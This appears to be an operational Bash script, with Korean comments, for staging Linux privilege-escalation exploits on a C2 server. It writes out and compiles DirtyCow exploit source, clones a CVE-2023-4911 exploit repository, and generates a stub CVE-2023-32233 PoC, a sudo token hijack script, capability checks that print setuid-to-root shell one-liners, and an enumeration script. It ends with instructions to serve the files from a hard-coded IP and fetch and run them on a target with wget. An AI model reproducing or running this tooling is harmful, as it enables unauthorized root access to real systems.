#!/bin/bash
#
# 커널 익스플로잇 준비 스크립트
# C2 서버에서 실행하여 exploit들을 다운로드하고 컴파일
#
# 사용법: ./prepare_kernel_exploits.sh
#

EXPLOIT_DIR="kernel_exploits"
mkdir -p "$EXPLOIT_DIR"
cd "$EXPLOIT_DIR"

echo "============================================================"
echo "Kernel Exploit 준비 스크립트"
echo "============================================================"
echo "작업 디렉토리: $(pwd)"
echo ""

# 1. CVE-2023-32233 (Netfilter nf_tables UAF)
echo "[1] CVE-2023-32233 다운로드 중..."
if [ ! -f "cve-2023-32233.c" ]; then
    cat > cve-2023-32233.c << 'EXPLOIT_EOF'
/*
 * CVE-2023-32233 - Netfilter nf_tables UAF
 * Linux Kernel 6.3.1 이하
 *
 * Usage: ./exploit
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netlink.h>
#include <errno.h>
#include <sched.h>
#include <sys/wait.h>

#define NETLINK_NETFILTER 12
#define NFT_MSG_NEWSET 10
#define NFT_MSG_NEWSETELEM 13

struct nfgenmsg {
    unsigned char nfgen_family;
    unsigned char version;
    unsigned short res_id;
};

void err(const char *msg) {
    perror(msg);
    exit(1);
}

int main(void) {
    printf("[*] CVE-2023-32233 - Netfilter UAF Exploit\n");
    printf("[*] Target: Linux Kernel <= 6.3.1\n");
    printf("[*] By: Liuk3r\n\n");

    // 이 exploit은 실제로는 더 복잡한 구현이 필요
    // 여기서는 개념 증명 코드만 표시

    printf("[*] Creating user namespace...\n");

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        err("[-] unshare failed");
    }

    printf("[+] User namespace created\n");
    printf("[*] Creating netlink socket...\n");

    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) {
        err("[-] socket failed");
    }

    printf("[+] Netlink socket created\n");
    printf("[!] Note: This is a simplified PoC\n");
    printf("[!] For full exploit, download from: https://github.com/Liuk3r/CVE-2023-32233\n");

    // 실제 exploit 로직은 매우 복잡하며
    // 커널 메모리 조작이 필요

    printf("\n[-] This is a stub. Use real exploit from GitHub.\n");

    close(sock);
    return 1;
}
EXPLOIT_EOF

    echo "[+] cve-2023-32233.c 생성"
    echo "[*] 컴파일 중..."
    gcc -o cve-2023-32233 cve-2023-32233.c -static -lpthread 2>/dev/null
    if [ -f cve-2023-32233 ]; then
        echo "[+] 컴파일 완료: cve-2023-32233"
    else
        echo "[-] 컴파일 실패 (실제 exploit은 GitHub에서 받아야 함)"
    fi
else
    echo "[*] 이미 존재함"
fi
echo ""

# 2. CVE-2023-4911 (Looney Tunables)
echo "[2] CVE-2023-4911 다운로드 중..."
if [ ! -d "CVE-2023-4911" ]; then
    git clone https://github.com/leesh3288/CVE-2023-4911.git 2>/dev/null
    if [ -d "CVE-2023-4911" ]; then
        echo "[+] CVE-2023-4911 다운로드 완료"
        cd CVE-2023-4911
        # 컴파일 시도
        if [ -f "Makefile" ]; then
            make 2>/dev/null
        fi
        cd ..
    else
        echo "[-] 다운로드 실패 (git이 필요함)"
    fi
else
    echo "[*] 이미 존재함"
fi
echo ""

# 3. DirtyCow (CVE-2016-5195) - 오래된 커널용
echo "[3] DirtyCow (백업용)..."
if [ ! -f "dirtycow.c" ]; then
    cat > dirtycow.c << 'DIRTYCOW_EOF'
/*
 * DirtyCow - CVE-2016-5195
 * Linux Kernel 2.6.22 - 4.8.3
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 200000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("[*] madvise %d\n\n", c);
}

void *procselfmemThread(void *arg) {
    char *str = (char*)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 200000000; i++) {
        lseek(f, map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("[*] /proc/self/mem %d\n\n", c);
}

int main(int argc, char *argv[]) {
    printf("[*] DirtyCow - CVE-2016-5195\n");

    if(argc < 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        return 1;
    }

    pthread_t pth1, pth2;
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    name = argv[1];

    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    printf("[*] mmap %p\n\n", map);

    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, "modified");

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}
DIRTYCOW_EOF

    echo "[+] dirtycow.c 생성"
    gcc -o dirtycow dirtycow.c -pthread -static 2>/dev/null
    if [ -f dirtycow ]; then
        echo "[+] 컴파일 완료"
    fi
else
    echo "[*] 이미 존재함"
fi
echo ""

# 4. Sudo token hijack script
echo "[4] Sudo token hijack 스크립트..."
cat > sudo_token_hijack.sh << 'SUDO_EOF'
#!/bin/bash
#
# Sudo Token Hijack (ptrace_scope = 0)
#

echo "[*] Sudo Token Hijack"
echo "[*] Checking ptrace_scope..."

PTRACE=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
if [ "$PTRACE" != "0" ]; then
    echo "[-] ptrace_scope = $PTRACE (need 0)"
    exit 1
fi

echo "[+] ptrace_scope = 0 (vulnerable)"
echo ""

echo "[*] Searching for sudo processes..."
SUDO_PIDS=$(ps aux | grep sudo | grep -v grep | awk '{print $2}')

if [ -z "$SUDO_PIDS" ]; then
    echo "[-] No sudo processes found"
    exit 1
fi

echo "[+] Found sudo processes:"
ps aux | grep sudo | grep -v grep

echo ""
echo "[*] Checking sudo timestamps..."
find /var/lib/sudo/ts -type f -mmin -5 2>/dev/null
find /var/run/sudo/ts -type f -mmin -5 2>/dev/null

echo ""
echo "[!] Manual exploitation required"
echo "[!] Use sudo_inject or ptrace attach to sudo process"
SUDO_EOF

chmod +x sudo_token_hijack.sh
echo "[+] sudo_token_hijack.sh 생성"
echo ""

# 5. Capabilities 체크 스크립트
echo "[5] Capabilities 체크 스크립트..."
cat > check_capabilities.sh << 'CAP_EOF'
#!/bin/bash
#
# Capabilities 기반 권한 상승 체크
#

echo "[*] Checking capabilities..."
echo ""

echo "=== 1. Files with capabilities ==="
getcap -r / 2>/dev/null
echo ""

echo "=== 2. Current process capabilities ==="
cat /proc/self/status | grep Cap
echo ""

echo "=== 3. Known exploitable capabilities ==="
echo "CAP_SETUID - 직접 root로 전환 가능"
echo "CAP_DAC_OVERRIDE - 파일 권한 무시"
echo "CAP_SYS_ADMIN - 많은 권한 획득"
echo ""

# Python cap_setuid 체크
if which python3 >/dev/null 2>&1; then
    PYTHON_CAP=$(getcap $(which python3) 2>/dev/null)
    if echo "$PYTHON_CAP" | grep -q cap_setuid; then
        echo "[!] Python3 has cap_setuid!"
        echo "[!] python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
    fi
fi

# Perl cap_setuid 체크
if which perl >/dev/null 2>&1; then
    PERL_CAP=$(getcap $(which perl) 2>/dev/null)
    if echo "$PERL_CAP" | grep -q cap_setuid; then
        echo "[!] Perl has cap_setuid!"
        echo "[!] perl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/bash\";'"
    fi
fi
CAP_EOF

chmod +x check_capabilities.sh
echo "[+] check_capabilities.sh 생성"
echo ""

# 6. 전체 권한 상승 체크 스크립트
echo "[6] 통합 권한 상승 체크 스크립트..."
cat > full_priv_check.sh << 'FULL_EOF'
#!/bin/bash
#
# 모든 권한 상승 벡터 빠른 체크
#

echo "======================================"
echo "Full Privilege Escalation Check"
echo "======================================"
echo ""

echo "[1] SUDO"
sudo -l 2>/dev/null && echo "[+] sudo -l 성공" || echo "[-] sudo 실패"
echo ""

echo "[2] SUID"
find / -perm -4000 -type f 2>/dev/null | grep -v "snap" | head -20
echo ""

echo "[3] Capabilities"
getcap -r / 2>/dev/null | head -10
echo ""

echo "[4] Writable /etc/passwd"
test -w /etc/passwd && echo "[!] WRITABLE!" || echo "[-] Not writable"
echo ""

echo "[5] Writable /etc/shadow"
test -w /etc/shadow && echo "[!] WRITABLE!" || echo "[-] Not writable"
echo ""

echo "[6] Docker Group"
groups | grep docker && echo "[+] In docker group" || echo "[-] Not in docker"
echo ""

echo "[7] Ptrace Scope"
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
echo ""

echo "[8] Kernel Version"
uname -r
echo ""

echo "[9] glibc Version"
ldd --version | head -1
echo ""

echo "[10] Netfilter"
lsmod | grep nf_tables
echo ""

echo "[11] Cron Jobs"
ls -la /etc/cron* 2>/dev/null | grep -v total
echo ""

echo "[12] MySQL"
ps aux | grep mysql | grep -v grep
echo ""

echo "[13] Writable /etc files"
find /etc -writable -type f 2>/dev/null | head -5
echo ""
FULL_EOF

chmod +x full_priv_check.sh
echo "[+] full_priv_check.sh 생성"
echo ""

# HTTP 서버 시작 안내
echo "============================================================"
echo "준비 완료!"
echo "============================================================"
echo ""
echo "생성된 파일들:"
ls -lh
echo ""
echo "다음 명령어로 HTTP 서버 시작:"
echo "  python3 -m http.server 5000"
echo ""
echo "타겟에서 다운로드:"
echo "  cd /tmp"
echo "  wget http://13.158.67.78:5000/full_priv_check.sh"
echo "  bash full_priv_check.sh"
echo ""
echo "실제 CVE-2023-32233 exploit 다운로드:"
echo "  git clone https://github.com/Liuk3r/CVE-2023-32233.git"
echo "  cd CVE-2023-32233"
echo "  gcc -o exploit exploit.c -static -lpthread"
echo ""
